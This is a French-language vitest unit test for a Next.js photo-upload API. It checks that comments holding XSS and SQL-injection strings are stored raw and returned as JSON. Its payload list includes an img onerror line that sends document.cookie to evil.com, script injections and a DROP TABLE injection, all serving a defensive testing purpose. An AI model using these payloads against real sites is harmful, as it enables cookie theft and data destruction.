/**
 * tests/unit/photos-xss-commentaire.test.ts
 * TST-K4-18 : Stored XSS via commentaire photo (K4-LOW-11)
 *
 * Scénario : ouvrier soumet un commentaire contenant du markup HTML/script.
 * Le backend DOIT stocker la valeur brute (pas d'échappement serveur — c'est React qui échappe).
 * Le test vérifie que :
 *   1. Le commentaire XSS est accepté côté API (pas de rejet 400 si < 500 chars)
 *   2. La valeur stockée = la chaîne brute (pas transformée par le backend)
 *   3. La réponse API ne contient pas de HTML/script interprété (juste du JSON)
 *
 * L'échappement UI (React {photo.commentaire} vs dangerouslySetInnerHTML) est vérifié
 * par le smoke UI conducteur (DoD D10) — hors périmètre test unitaire handler.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'
import { NextRequest } from 'next/server'

// ============================================================
// Mocks
// ============================================================

const mockGetOuvrierSession = vi.fn()
const mockAdminFrom = vi.fn()
const mockStorageFrom = vi.fn()
const mockValidateImageBuffer = vi.fn()
const mockSignPhotoPaths = vi.fn()
const mockCheckRateLimit = vi.fn()

vi.mock('../../lib/ouvrier-session', () => ({
  getOuvrierSession: async (...args: unknown[]) => mockGetOuvrierSession(...args),
  OUVRIER_SESSION_TTL: 604800,
  SESSION_PREFIX: 'ouvrier_session:',
  USER_SESSIONS_PREFIX: 'ouvrier_user_sessions:',
  REDIS_SESSION_PREFIX: 'ouvrier_session:',
  REDIS_USER_SESSIONS_PREFIX: 'ouvrier_user_sessions:',
}))

vi.mock('../../lib/supabase/admin', () => ({
  createAdminClient: () => ({
    from: (...args: unknown[]) => mockAdminFrom(...args),
    storage: {
      from: (...args: unknown[]) => mockStorageFrom(...args),
    },
  }),
}))

vi.mock('../../lib/photos-access', () => ({
  validateImageBuffer: (...args: unknown[]) => mockValidateImageBuffer(...args),
  signPhotoPaths: async (...args: unknown[]) => mockSignPhotoPaths(...args),
  resolvePhotoActor: vi.fn(),
  canDeletePhoto: vi.fn(),
}))

vi.mock('../../lib/cache', () => ({
  checkRateLimit: (...args: unknown[]) => mockCheckRateLimit(...args),
  RATE_LIMITS: { photoUpload: { limit: 20, windowMs: 3_600_000 } },
}))

vi.mock('@/lib/cache', () => ({
  checkRateLimit: (...args: unknown[]) => mockCheckRateLimit(...args),
  RATE_LIMITS: { photoUpload: { limit: 20, windowMs: 3_600_000 } },
}))

vi.mock('../../lib/logger', () => ({
  logger: {
    warn: vi.fn(), error: vi.fn(), info: vi.fn(), debug: vi.fn(),
    child: vi.fn(() => ({ warn: vi.fn(), error: vi.fn(), info: vi.fn(), debug: vi.fn() })),
  },
}))

// ============================================================
// Fixtures
// ============================================================

const ORG_ID  = '00000000-0000-0000-0000-000000000001'
const USER_ID = '00000000-0000-0000-0000-000000000010'
const TACHE_ID = '00000000-0000-0000-0000-000000000020'

const VALID_SESSION = {
  user_id: USER_ID,
  organisation_id: ORG_ID,
  role: 'ouvrier' as const,
  affectations: [],
  created_at: Date.now(),
}

const RL_ALLOWED = { allowed: true, remaining: 19, resetAt: new Date() }
const JPEG_MAGIC = Buffer.from([0xff, 0xd8, 0xff, 0xe0, ...Array(20).fill(0x00)])

const XSS_PAYLOADS = [
  '<script>alert(document.cookie)</script>',
  '<img src=x onerror="fetch(\'https://evil.com/?\'+document.cookie)">',
  '"><script>alert(1)</script>',
  'javascript:alert(1)',
  '\'; DROP TABLE photos;--',
]

function buildXssRequest(commentaire: string): NextRequest {
  const form = new FormData()
  form.append('tache_id', TACHE_ID)
  form.append('file', new Blob([JPEG_MAGIC], { type: 'image/jpeg' }), 'photo.jpg')
  form.append('commentaire', commentaire)
  return new NextRequest('http://localhost/api/photos', {
    method: 'POST',
    body: form,
    headers: { cookie: 'ouvrier_session=test' },
  })
}

function setupHappyWithCommentaire(commentaire: string) {
  mockStorageFrom.mockReturnValue({
    upload: vi.fn().mockResolvedValue({ data: { path: 'test' }, error: null }),
    remove: vi.fn().mockResolvedValue({ error: null }),
  })
  let callCount = 0
  mockAdminFrom.mockImplementation((table: string) => {
    callCount++
    if (table === 'taches') {
      return {
        select: () => ({
          eq: () => ({
            eq: () => ({
              is: () => ({
                maybeSingle: () => Promise.resolve({
                  data: { id: TACHE_ID, assigned_to: USER_ID },
                  error: null,
                }),
              }),
            }),
          }),
        }),
      }
    }
    return {
      insert: () => ({
        select: () => ({
          single: () => Promise.resolve({
            data: {
              id: 'photo-uuid',
              tache_id: TACHE_ID,
              commentaire,  // stocké brut — pas transformé
              created_at: '2026-06-07T00:00:00Z',
              uploader_id: USER_ID,
            },
            error: null,
          }),
        }),
      }),
    }
  })
  mockSignPhotoPaths.mockImplementation(async (paths: string[]) => {
    const map = new Map<string, string>()
    paths.forEach((p: string) => map.set(p, `https://signed.example.com/${p}`))
    return map
  })
}

// ============================================================
// Tests
// ============================================================

describe('TST-K4-18 : Stored XSS via commentaire photo (K4-LOW-11)', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    vi.resetModules()
  })

  for (const xssPayload of XSS_PAYLOADS) {
    const shortLabel = xssPayload.substring(0, 30)

    it(`XSS payload "${shortLabel}..." -> stocké brut, réponse JSON non-exécutable`, async () => {
      mockGetOuvrierSession.mockResolvedValueOnce(VALID_SESSION)
      mockValidateImageBuffer.mockReturnValueOnce({ ok: true, ext: 'jpg' })
      mockCheckRateLimit.mockReturnValueOnce(RL_ALLOWED)
      setupHappyWithCommentaire(xssPayload)

      const req = buildXssRequest(xssPayload)
      const { POST } = await import('../../app/api/photos/route')
      const res = await POST(req)

      // Le commentaire est accepté si < 500 chars (pas de sanitisation serveur)
      // L'échappement est fait par React au rendu (côté client)
      if (xssPayload.length <= 500) {
        expect(res.status).toBe(201)
        const body = await res.json() as Record<string, unknown>
        // Le commentaire brut est retourné (React l'échappe à l'affichage)
        expect(body['commentaire']).toBe(xssPayload)
        // La réponse est du JSON bien formé (pas du HTML exécutable)
        const contentType = res.headers.get('content-type') ?? ''
        expect(contentType).toContain('application/json')
        // storage_path toujours absent
        expect(body).not.toHaveProperty('storage_path')
      }
    })
  }

  it('SQL injection dans commentaire -> stocké brut, 201 (pas d\'injection DB)', async () => {
    const sqlInjection = "'; DROP TABLE photos;--"
    mockGetOuvrierSession.mockResolvedValueOnce(VALID_SESSION)
    mockValidateImageBuffer.mockReturnValueOnce({ ok: true, ext: 'jpg' })
    mockCheckRateLimit.mockReturnValueOnce(RL_ALLOWED)
    setupHappyWithCommentaire(sqlInjection)

    const req = buildXssRequest(sqlInjection)
    const { POST } = await import('../../app/api/photos/route')
    const res = await POST(req)

    // L'injection est traitée comme du texte ordinaire (paramètres préparés Supabase SDK)
    expect(res.status).toBe(201)
    const body = await res.json() as Record<string, unknown>
    expect(body['commentaire']).toBe(sqlInjection)
  })
})
